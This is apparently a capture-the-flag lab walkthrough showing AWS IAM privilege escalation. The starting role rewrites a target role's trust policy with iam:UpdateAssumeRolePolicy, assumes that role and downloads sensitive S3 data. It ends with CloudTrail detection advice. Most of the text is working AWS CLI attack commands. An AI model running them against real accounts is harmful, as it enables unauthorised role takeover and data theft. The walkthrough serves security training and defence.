# Guided Walkthrough: One-Hop Privilege Escalation via iam:UpdateAssumeRolePolicy

This scenario demonstrates how an attacker with `iam:UpdateAssumeRolePolicy` permission can modify a role's trust policy to allow themselves to assume it. The technique is deceptively simple: rather than trying to grant new permissions directly, the attacker rewrites *who is allowed to assume* an existing privileged role. Once they've added their own role to the trust policy, they can assume it and inherit all of its permissions.

This vulnerability is particularly dangerous because `iam:UpdateAssumeRolePolicy` is not always recognized as a privilege escalation primitive. Administrators may grant it thinking it is only an administrative maintenance permission, without realizing it gives the holder a key to any role whose trust policy they can modify. In this scenario, the target role has S3 read/write access to a sensitive data bucket — a realistic representation of a data pipeline or application role.

The attack pattern appears frequently in real AWS environments where developers or service roles have been granted broad IAM permissions "for convenience" without a clear understanding of the escalation paths they enable.

## The Challenge

You start with credentials for `pl-prod-iam-012-to-bucket-starting-user`, an IAM user that can assume `pl-prod-iam-012-to-bucket-starting-role`. That starting role carries the `iam:UpdateAssumeRolePolicy` permission scoped to `pl-prod-iam-012-to-bucket-target-role`, as well as `sts:AssumeRole` on the same target role (though the trust policy currently blocks it).

Your goal is to reach the sensitive S3 bucket `pl-prod-iam-012-to-bucket-{account_id}-{resource_suffix}` and download `sensitive-data.txt`. You cannot access it yet — only the target role has the necessary S3 permissions, and the target role does not currently trust you.

## Reconnaissance

First, confirm your identity and understand the landscape. After assuming the starting role, check what you can see:

```bash
# Confirm you are operating as the starting role
aws sts get-caller-identity
```

Now look at the target role's current trust policy to understand what is blocking you:

```bash
aws iam get-role \
  --role-name pl-prod-iam-012-to-bucket-target-role \
  --query 'Role.AssumeRolePolicyDocument'
```

The trust policy will show that the starting role is not listed as a trusted principal — any attempt to assume the target role will fail with an access denied error. Confirm this:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-012-to-bucket-target-role \
  --role-session-name test-session
# Expected: An error occurred (AccessDenied)
```

Similarly, try accessing the bucket directly as the starting role to confirm the permission gap:

```bash
aws s3 ls s3://pl-prod-iam-012-to-bucket-{account_id}-{resource_suffix}/
# Expected: An error occurred (AccessDenied)
```

You have `iam:UpdateAssumeRolePolicy` on the target role. That is the key.

## Exploitation

### Step 1: Modify the trust policy

Build a new trust policy document that allows your starting role to assume the target role, then apply it:

```bash
aws iam update-assume-role-policy \
  --role-name pl-prod-iam-012-to-bucket-target-role \
  --policy-document '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Allow",
      "Principal": {
        "AWS": "arn:aws:iam::{account_id}:role/pl-prod-iam-012-to-bucket-starting-role"
      },
      "Action": "sts:AssumeRole"
    }]
  }'
```

IAM changes take a moment to propagate. Wait 15 seconds before proceeding.

### Step 2: Assume the target role

Now that the trust policy allows it, assume the target role:

```bash
aws sts assume-role \
  --role-arn arn:aws:iam::{account_id}:role/pl-prod-iam-012-to-bucket-target-role \
  --role-session-name bucket-access-session \
  --output json
```

Export the returned credentials into your shell environment (`AWS_ACCESS_KEY_ID`, `AWS_SECRET_ACCESS_KEY`, `AWS_SESSION_TOKEN`).

### Step 3: Access the S3 bucket

With the target role's credentials active, you now have the S3 permissions it carries:

```bash
# List the bucket contents
aws s3 ls s3://pl-prod-iam-012-to-bucket-{account_id}-{resource_suffix}/

# Download the sensitive data
aws s3 cp s3://pl-prod-iam-012-to-bucket-{account_id}-{resource_suffix}/sensitive-data.txt .
```

## Verification

Confirm your new identity to verify the role assumption succeeded:

```bash
aws sts get-caller-identity
# Should show: .../pl-prod-iam-012-to-bucket-target-role/bucket-access-session
```

Then confirm the file downloaded successfully and read its contents. If you can `cat` the file, the attack chain is complete.

## Capture the Flag

The target bucket contains a `flag.txt` object placed there by Terraform. Read it directly to stdout using the target role's credentials:

```bash
aws s3 cp s3://$BUCKET_NAME/flag.txt -
```

Replace `$BUCKET_NAME` with the full bucket name (e.g. `pl-prod-iam-012-to-bucket-{account_id}-{resource_suffix}`). If you have already exported the target role credentials into your shell, this command will print the flag value immediately.

## What Happened

The full attack chain was:

```
pl-prod-iam-012-to-bucket-starting-user
  → (sts:AssumeRole) → pl-prod-iam-012-to-bucket-starting-role
  → (iam:UpdateAssumeRolePolicy) → modified trust policy on pl-prod-iam-012-to-bucket-target-role
  → (sts:AssumeRole) → pl-prod-iam-012-to-bucket-target-role
  → (s3:GetObject) → sensitive-data.txt
```

The starting role never had S3 permissions. Instead, it had a single IAM permission — `iam:UpdateAssumeRolePolicy` — that allowed it to rewrite the rules of who can access a more powerful role. This is the essence of privilege escalation through trust manipulation: you don't need to be granted access directly if you can grant access to yourself.

In real environments, this attack is difficult to detect before it happens because modifying a trust policy is an infrequent but entirely legitimate administrative operation. The detection window is the brief period between the `UpdateAssumeRolePolicy` call and the subsequent `AssumeRole`. Correlating these two events in CloudTrail — especially when they occur close together for a non-admin principal — is the primary detection signal.
